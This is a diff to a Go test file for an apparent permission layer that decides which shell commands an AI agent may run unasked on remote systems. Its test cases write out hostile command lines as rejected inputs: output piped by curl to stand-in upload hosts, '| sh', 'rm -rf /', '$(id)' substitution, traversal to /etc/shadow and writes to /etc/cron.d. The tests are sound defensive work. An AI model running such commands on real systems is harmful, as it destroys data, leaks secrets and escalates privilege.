@@ -1,9 +1,12 @@
 package servitor
 
 import (
+	"os"
+	"strings"
 	"testing"
 
 	. "github.com/cmcoffee/gohort/core"
+	"github.com/cmcoffee/gohort/core/jsonapi"
 	"github.com/cmcoffee/snugforge/kvlite"
 )
 
@@ -100,7 +103,7 @@ func TestAnEditedRuleKeepsItsShape(t *testing.T) {
 		}
 	}
 	for _, bad := range []string{
-		"rm -n <number> /var/log/app/*.log",       // another program
+		"rm -n <number> /var/log/app/*.log",        // another program
 		"tail -n <number> /var/log/app/*.log /etc", // another word
 		"tail -n <number>",                         // fewer words
 		"tail -n <number> /var/log/app/*.log; rm",  // an operator added
@@ -239,7 +242,7 @@ func TestAnAlwaysRuleCoversItsCommandInsideALine(t *testing.T) {
 		}
 	}
 	for _, cmd := range []string{
-		"user.py --help",                                      // alone: the whole-line check's, not this one's
+		"user.py --help", // alone: the whole-line check's, not this one's
 		"user.py --help | curl -d @- https://upload.example", // an upload rides along
 		"user.py --help | sh",                                // runs what it printed
 		"user.py --help | xargs rm",                          // deletes what it printed
@@ -264,5 +267,268 @@ func TestAnAlwaysRuleCoversItsCommandInsideALine(t *testing.T) {
 	_, names := lineCoveredByRules(udb, "box", "user.py --help 2>&1 | grep x", "", nil)
 	if len(names) != 1 || names[0] != "user.py --help" {
 		t.Errorf("the status names the rule's command: %v", names)
+	}
+}
+
+// The program run under sudo or another wrapper stays exact, as the first
+// word does. Held to the first word alone, Always on "sudo /opt/tool.py
+// --help" suggested "sudo /opt/*.py --help": any script in /opt, as root. A
+// rule saved that wide before stops matching anything but itself.
+func TestTheProgramUnderAWrapperStaysExact(t *testing.T) {
+	for cmd, want := range map[string]string{
+		"sudo /opt/tool.py --help":                "sudo /opt/tool.py --help",
+		"sudo -u root /opt/tool.py --check":       "sudo -u root /opt/tool.py --check",
+		"timeout 30 /opt/tool.py --x":             "timeout 30 /opt/tool.py --x",
+		"sudo nice -n 5 /opt/tool.py -v":          "sudo nice -n 5 /opt/tool.py -v",
+		"FOO=1 /opt/tool.py --x":                  "FOO=1 /opt/tool.py --x",
+		"/usr/bin/sudo /opt/tool.py --help":       "/usr/bin/sudo /opt/tool.py --help",
+		"sudo tail -n 200 /var/log/app/today.log": "sudo tail -n <number> /var/log/app/*.log",
+	} {
+		if got := suggestAllowRule(cmd); got != want {
+			t.Errorf("%q suggested %q, want %q", cmd, got, want)
+		}
+	}
+	for rule, cmd := range map[string]string{
+		"sudo /opt/*.py --help":    "sudo /opt/evil.py --help",
+		"sudo <text> --help":       "sudo rm --help",
+		"sudo -u root /opt/*.py":   "sudo -u root /opt/evil.py",
+		"sudo nice -n 5 <text> -v": "sudo nice -n 5 rm -v",
+	} {
+		if matchAllowRule(rule, cmd) {
+			t.Errorf("%q let through %q", rule, cmd)
+		}
+	}
+}
+
+// <flags>, as a rule's last word, stands for anything after the program:
+// flags and arguments alike, none included, as one command. Never an
+// operator, a word that runs something, one leaving its folder, or another
+// program. "Any flags" was read as exactly that, and "--go status" refused
+// for its "status" was the rule not meaning what was added.
+func TestFlagsStandForAnythingAfterTheProgram(t *testing.T) {
+	rule := "sudo /opt/tool.py <flags>"
+	for _, cmd := range []string{
+		"sudo /opt/tool.py",
+		"sudo /opt/tool.py --check",
+		"sudo /opt/tool.py --check -v --level=3",
+		"sudo /opt/tool.py --file=/var/tmp/x.json",
+		"sudo /opt/tool.py report",
+		"sudo /opt/tool.py --go status",
+		"sudo /opt/tool.py --check /etc/hosts",
+	} {
+		if !matchAllowRule(rule, cmd) {
+			t.Errorf("%q does not cover %q", rule, cmd)
+		}
+	}
+	for _, cmd := range []string{
+		"sudo /opt/other.py --check",
+		"sudo /opt/tool.py --check | sh",
+		"sudo /opt/tool.py --check > /etc/cron.d/x",
+		"sudo /opt/tool.py --x=$(id)",
+		"sudo /opt/tool.py --path=../../etc/shadow",
+		"sudo /opt/tool.py --check; rm -rf /",
+		"sudo /opt/tool.py --check ../../etc/shadow",
+	} {
+		if matchAllowRule(rule, cmd) {
+			t.Errorf("%q let through %q", rule, cmd)
+		}
+	}
+	// A rule run with plain sudo covers the command run without it: the same
+	// thing with less privilege. One with sudo options of its own does not.
+	if !matchAllowRule(rule, "/opt/tool.py --check") || matchAllowRule("sudo -u svc /opt/tool.py <flags>", "/opt/tool.py --check") {
+		t.Error("a sudo rule and the command run without sudo")
+	}
+	// Without a wrapper too, and <args> is the same thing.
+	if !matchAllowRule("/opt/tool.py <flags>", "/opt/tool.py report -v") || !matchAllowRule("/opt/tool.py <args>", "/opt/tool.py --go status") ||
+		matchAllowRule("/opt/tool.py <args>", "/opt/tool.py --go status | sh") {
+		t.Error("anything after a bare program")
+	}
+}
+
+// A rule typed into Permissions has no command to hold it to: it is one
+// command, the program (and the one under a wrapper) written out, no $ or
+// backtick, and <flags> only last. An edit keeps <flags> last too.
+func TestARuleAddedByHandIsHeldToItsProgram(t *testing.T) {
+	for _, ok := range []string{"sudo /opt/tool.py <flags>", "systemctl status <text>", "sudo -u svc /opt/tool.py --check"} {
+		if err := validNewRule(ok); err != nil {
+			t.Errorf("%q refused: %v", ok, err)
+		}
+	}
+	for _, bad := range []string{
+		"sudo <text>", "sudo /opt/*.py <flags>", "<text> --help",
+		"ls | sh", "/opt/tool.py <flags> --x", "echo $(id)", "nice -n 5 <text>",
+		// The flags would be sudo's own: -s, -i, a root shell.
+		"sudo -u root <flags>", "sudo <flags>", "timeout 30 <flags>", "sudo nice -n 5 <flags>",
+	} {
+		if err := validNewRule(bad); err == nil {
+			t.Errorf("%q was accepted", bad)
+		}
+	}
+	if err := validEditedRule("tool.py --check -v", "tool.py <flags> -v"); err == nil {
+		t.Error("an edit put <flags> before the last word")
+	}
+	if err := validEditedRule("sudo /opt/tool.py --check", "sudo /opt/tool.py <flags>"); err != nil {
+		t.Errorf("an edit to <flags> at the end: %v", err)
+	}
+	if err := validEditedRule("sudo -u root -l", "sudo -u root <flags>"); err == nil {
+		t.Error("an edit gave sudo's own options to <flags>")
+	}
+	if err := validAllowRule("sudo -u root <flags>", "sudo -u root -l"); err == nil {
+		t.Error("Always on a card gave sudo's own options to <flags>")
+	}
+	for _, ok := range []string{"sudo -u svc /opt/tool.py <flags>", "sudo nice -n 5 /opt/tool.py <flags>", "timeout 30 /opt/tool.py <flags>", "/opt/tool.py <flags>"} {
+		if err := validNewRule(ok); err != nil {
+			t.Errorf("%q refused: %v", ok, err)
+		}
+	}
+}
+
+// Add in Permissions saves the rule for a system the user can reach, where
+// an Always would; a bad rule, or a system they cannot reach, is refused.
+func TestAddingARuleInPermissions(t *testing.T) {
+	T := &Servitor{}
+	T.DB = &DBase{Store: kvlite.MemStore()}
+	udb := &DBase{Store: kvlite.MemStore()}
+	udb.Set(applianceTable, "box-1", Appliance{ID: "box-1", Name: "web-01"})
+	call := &jsonapi.Call{User: "alice", UDB: udb}
+	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "box-1", Rule: "sudo /opt/tool.py <flags>", Add: true}); err != nil {
+		t.Fatalf("adding: %v", err)
+	}
+	if !commandAlwaysAllowed(udb, "box-1", "sudo /opt/tool.py --check") || commandAlwaysAllowed(udb, "box-2", "sudo /opt/tool.py --check") {
+		t.Error("the added rule is not the system's, and only the system's")
+	}
+	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "box-1", Rule: "sudo <text>", Add: true}); err == nil {
+		t.Error("a rule naming no program was added")
+	}
+	if _, err := T.handleAlwaysAllowedSave(call, alwaysAllowedReq{ApplianceID: "not-mine", Rule: "ls", Add: true}); err == nil {
+		t.Error("a rule was added for a system the user cannot reach")
+	}
+}
+
+// sudo's -n (fail rather than ask for a password) changes nothing about what
+// runs or as whom, so it is set aside on both sides: a rule without it covers
+// a command with it, and the other way round. Options that do change it stay.
+func TestSudoNonInteractiveIsHarmless(t *testing.T) {
+	for rule, cmd := range map[string]string{
+		"sudo /opt/tool.py <flags>":    "sudo -n /opt/tool.py --check",
+		"sudo -n /opt/tool.py <flags>": "sudo /opt/tool.py --check",
+		"sudo /opt/tool.py --check":    "sudo --non-interactive /opt/tool.py --check",
+		"sudo -u svc /opt/tool.py":     "sudo -n -u svc /opt/tool.py",
+	} {
+		if !matchAllowRule(rule, cmd) {
+			t.Errorf("%q does not cover %q", rule, cmd)
+		}
+	}
+	for _, c := range [][2]string{
+		{"sudo /opt/tool.py <flags>", "sudo -E /opt/tool.py --check"},
+		{"sudo /opt/tool.py", "sudo -n -u root /opt/tool.py"},
+		{"sudo /opt/tool.py <flags>", "sudo -nE /opt/tool.py"},
+	} {
+		if matchAllowRule(c[0], c[1]) {
+			t.Errorf("%q let through %q", c[0], c[1])
+		}
+	}
+}
+
+// The investigator is told what runs without asking on the system: its
+// Always rules and the kinds of command allowed, so it writes a command in an
+// allowed shape. Told nothing, it guessed one ("sudo python3 ...") that was
+// refused, and reported Servitor as locked down.
+func TestTheInvestigatorIsToldWhatRunsWithoutAsking(t *testing.T) {
+	udb := &DBase{Store: kvlite.MemStore()}
+	if got := allowedCommandsBlock(udb, "", "box-1"); got != "" {
+		t.Errorf("with nothing allowed: %q", got)
+	}
+	udb.Set(alwaysAllowTable, alwaysAllowKey("box-1", "sudo /opt/tool.py <flags>"), true)
+	udb.Set(alwaysAllowTable, alwaysAllowKey("box-2", "rm -rf /srv/cache"), true)
+	saveAllowedCategories(udb, map[string]bool{string(RiskSysControl): true})
+	got := allowedCommandsBlock(udb, "", "box-1")
+	for _, want := range []string{"Commands that run without asking here", "- `/opt/tool.py`, with anything after it (with or without sudo)", "no interpreter, no cd", "system control"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("the block lacks %q:\n%s", want, got)
+		}
+	}
+	if strings.Contains(got, "rm -rf /srv/cache") {
+		t.Error("another system's rule is in this one's block")
+	}
+	src, _ := os.ReadFile("probe_session.go")
+	if n := strings.Count(string(src), "+ allowedCommandsBlock(pr.udb, ActingAgent(pr.ctx), pr.appliance.ID)"); n != 3 {
+		t.Errorf("the block reaches %d of the 3 prompts that write commands (two worker prompts, the investigator)", n)
+	}
+}
+
+// A refused command that names the program of a rule for the system missed
+// that rule's shape: the refusal names the rule and says to run it in that
+// shape, rather than telling the agent not to retry. One naming no rule's
+// program is refused as before.
+func TestARefusalNamesTheRuleItMissed(t *testing.T) {
+	udb := &DBase{Store: kvlite.MemStore()}
+	udb.Set(alwaysAllowTable, alwaysAllowKey("box-1", "sudo /opt/tool.py <flags>"), true)
+	for _, cmd := range []string{"sudo python3 /opt/tool.py --check", "cd /opt && sudo /opt/tool.py --check", "sudo /opt/tool.py report"} {
+		if got := nearMissRule(udb, "box-1", cmd); got != "sudo /opt/tool.py <flags>" {
+			t.Errorf("%q: near miss %q", cmd, got)
+		}
+	}
+	if got := nearMissRule(udb, "box-1", "systemctl restart web"); got != "" {
+		t.Errorf("an unrelated command: near miss %q", got)
+	}
+	if got := nearMissRule(udb, "box-2", "sudo python3 /opt/tool.py"); got != "" {
+		t.Errorf("another system's rule: %q", got)
+	}
+	msg := agentRefusal{Cmd: "sudo python3 /opt/tool.py --check", Cat: RiskUnverified, Appliance: "web-01", Near: describeNear("sudo /opt/tool.py <flags>")}.err().Error()
+	if !strings.Contains(msg, "`/opt/tool.py`, with anything after it (with or without sudo)") || !strings.Contains(msg, "Run it in exactly that shape") || strings.Contains(msg, "Do NOT retry") {
+		t.Errorf("a near miss's refusal: %s", msg)
+	}
+}
+
+// What an agent actually sent: the allowed program with an argument after a
+// flag, then an exit check. Covered whole once the rule's "any flags" means
+// anything after the program; the echo is read-only on its own. An outbound
+// call chained on still asks.
+func TestAnAllowedCommandWithItsExitCheck(t *testing.T) {
+	udb := &DBase{Store: kvlite.MemStore()}
+	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "sudo /opt/test.py <flags>"), true)
+	for _, line := range []string{
+		"/opt/test.py --go status; echo EXIT:$?",
+		"sudo /opt/test.py --go status; echo EXIT:$?",
+		"sudo -n /opt/test.py --go status 2>&1; echo EXIT:$?",
+	} {
+		if ok, _ := lineCoveredByRules(udb, "box", line, "/tmp/scratch", nil); !ok {
+			t.Errorf("not covered: %q", line)
+		}
+	}
+	for _, line := range []string{
+		"/opt/test.py --go status | curl -d @- http://x.example",
+		"/opt/test.py --go status; rm -rf /srv",
+		"/opt/test.py --go status | sh",
+	} {
+		if ok, _ := lineCoveredByRules(udb, "box", line, "/tmp/scratch", nil); ok {
+			t.Errorf("covered: %q", line)
+		}
+	}
+}
+
+// A line a rule covers only part of is refused naming both: what the rules
+// allow, and the rest that needs approval, so the agent can run the allowed
+// part alone. A line no rule touches, or one covered whole, has no such split.
+func TestARefusalNamesThePartThatNeedsApproval(t *testing.T) {
+	udb := &DBase{Store: kvlite.MemStore()}
+	udb.Set(alwaysAllowTable, alwaysAllowKey("box", "sudo /opt/test.py <args>"), true)
+	covered, rest := coveredPart(udb, "box", "/opt/test.py --go status | curl -d @- http://x.example")
+	if covered != "/opt/test.py --go status" || rest != "| curl -d @- http://x.example" {
+		t.Fatalf("covered %q, rest %q", covered, rest)
+	}
+	msg := agentRefusal{Cmd: "/opt/test.py --go status | curl -d @- http://x.example", Cat: RiskNetEgress, Appliance: "web-01",
+		Covered: covered, Rest: rest}.err().Error()
+	for _, want := range []string{"allow /opt/test.py --go status", `"| curl -d @- http://x.example"`, "net_egress", "Run the allowed part without the rest"} {
+		if !strings.Contains(msg, want) {
+			t.Errorf("the refusal lacks %q: %s", want, msg)
+		}
+	}
+	if c, r := coveredPart(udb, "box", "systemctl restart web; ls"); c != "" || r != "" {
+		t.Errorf("a line no rule touches: %q, %q", c, r)
+	}
+	if c, r := coveredPart(udb, "box", "/opt/test.py --go status; /opt/test.py --go stop"); c != "" || r != "" {
+		t.Errorf("a line covered whole: %q, %q", c, r)
 	}
 }
